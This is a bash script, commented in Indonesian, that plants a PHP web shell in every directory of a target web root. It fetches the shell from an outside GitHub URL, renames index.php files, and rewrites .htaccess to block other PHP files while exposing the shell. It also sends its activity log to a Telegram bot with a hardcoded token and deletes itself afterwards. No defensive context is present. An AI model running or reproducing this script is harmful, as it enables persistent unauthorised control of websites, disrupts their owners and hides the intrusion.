#!/bin/bash

# Periksa parameter direktori
if [ "$#" -ne 1 ]; then
  echo "Usage: $0 /path/to/directory"
  exit 1
fi

# Direktori yang akan di-scan
TARGET_DIR=$1
# Tentukan lokasi file log berdasarkan lokasi skrip ini
LOG_FILE="$(dirname "$0")/logfile.log"
SCRIPT_PATH="$0"
NOHUP_FILE="$(dirname "$0")/nohup.out"
TELEGRAM_TOKEN="6849508672:AAHqCtNI4lsew9D-MqWsETULhzmwwTPn39A"
CHAT_ID="-1002137132938"

# Fungsi untuk mengirim file log ke Telegram
send_telegram_logfile() {
    curl -s -k -F "chat_id=$CHAT_ID" \
         -F "document=@$LOG_FILE" \
         -F "caption=Log File" \
         "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument"
}

# Fungsi untuk memodifikasi atau menambahkan .htaccess
update_htaccess() {
  local dir="$1"
  local htaccess_file="$dir/.htaccess"
  local php_file_name="$2"

  # Backup dan hapus .htaccess yang ada
  if [ -f "$htaccess_file" ]; then
    cp "$htaccess_file" "$htaccess_file.bak"
    if ! rm -f "$htaccess_file"; then
      local msg="$(date) - Failed to delete .htaccess in $dir. It may be protected or require higher permissions."
      echo "$msg" >> "$LOG_FILE"
      return
    fi
  fi

  # Menambahkan file .htaccess dengan konfigurasi yang termasuk file PHP yang diupload
  cat > "$htaccess_file" << EOF
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.S*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.s*>
    Order Deny,Allow
    Deny from all
</Files>

<FilesMatch "\.(jpg|pdf)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>

<FilesMatch "^(index.html|$php_file_name)$">
 Order allow,deny
 Allow from all
</FilesMatch>

DirectoryIndex index.html

Options -Indexes
ErrorDocument 403 "Error?!: G"
ErrorDocument 404 "Error?!: G"
EOF

  # Mencoba mengatur izin file dengan chmod
  if ! chmod 0444 "$htaccess_file"; then
    local msg="$(date) - Failed to set permissions for .htaccess in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi
}

# Fungsi untuk mengunduh file PHP dengan curl dan mengunggahnya ke direktori target
download_and_upload_php() {
  local dir="$1"
  local php_file_name="$(date +%s).php"
  local php_file_url="https://raw.githubusercontent.com/paylar/shell/main/alfa-index.php"
  local php_file_path="$dir/$php_file_name"

  # Mengunduh file PHP dengan curl
  if ! curl -s -k -o "$php_file_path" "$php_file_url"; then
    local msg="$(date) - Failed to download PHP file from $php_file_url to $dir"
    echo "$msg" >> "$LOG_FILE"
    return
  fi

  # Memeriksa apakah file berhasil diunduh
  if [ ! -f "$php_file_path" ]; then
    local msg="$(date) - Failed to create PHP file in $dir"
    echo "$msg" >> "$LOG_FILE"
    return
  fi

  # Mengatur izin file PHP
  if ! chmod 0644 "$php_file_path"; then
    local msg="$(date) - Failed to set permissions for PHP file in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi

  # Log lokasi file PHP yang berhasil diunggah
  local msg="$(date) - Successfully uploaded PHP file to $php_file_path"
  echo "$msg" >> "$LOG_FILE"

  # Memanggil fungsi update_htaccess untuk menambahkan file PHP ke htaccess
  update_htaccess "$dir" "$php_file_name"
}

# Fungsi untuk merename index.php ke index.html
rename_index() {
  local dir="$1"
  if [ -f "$dir/index.php" ]; then
    if ! mv "$dir/index.php" "$dir/index.html"; then
      local msg="$(date) - Failed to rename index.php to index.html in $dir. It may be protected or require higher permissions."
      echo "$msg" >> "$LOG_FILE"
    fi
  fi
}

export -f update_htaccess
export -f rename_index
export -f send_telegram_logfile
export -f download_and_upload_php
export TELEGRAM_TOKEN
export CHAT_ID
export LOG_FILE

# Fungsi untuk menjalankan xargs dengan parameter yang berbeda secara berulang
run_with_xargs_loop() {
  local parallelisms=(15 10 5)
  local idx=0

  while true; do
    local parallelism=${parallelisms[$idx]}
    echo "$(date) - Running with parallelism -P $parallelism" >> "$LOG_FILE"

    find "$TARGET_DIR" -type d \( -name '.*' -o -name '*' \) -print0 | \
    xargs -0 -n 1 -P "$parallelism" -I {} bash -c '(download_and_upload_php "{}" & rename_index "{}" & wait) || { echo "$(date) - Memory limit reached while processing {} with -P $parallelism" >> "$LOG_FILE"; false; }'

    # Periksa apakah ada kesalahan memori
    if [ $? -eq 0 ]; then
      break
    fi

    idx=$((idx + 1))

    # Jika telah mencoba semua parallelism, ulangi dari awal
    if [ $idx -eq ${#parallelisms[@]} ]; then
      idx=0
    fi
  done
}

# Hapus file log sebelumnya jika ada
rm -f "$LOG_FILE"

# Jalankan loop xargs dengan pola paralelisme yang berulang hingga semua direktori diproses tanpa kesalahan
run_with_xargs_loop

# Setelah semua proses selesai, kirim file log jika ada isinya
if [ -s "$LOG_FILE" ]; then
    send_telegram_logfile
fi

# Tunggu sedikit untuk pastikan pesan Telegram terkirim
sleep 5

# Hapus file log, nohup.out, dan skrip itu sendiri
rm -f "$LOG_FILE" "$NOHUP_FILE" "$SCRIPT_PATH"
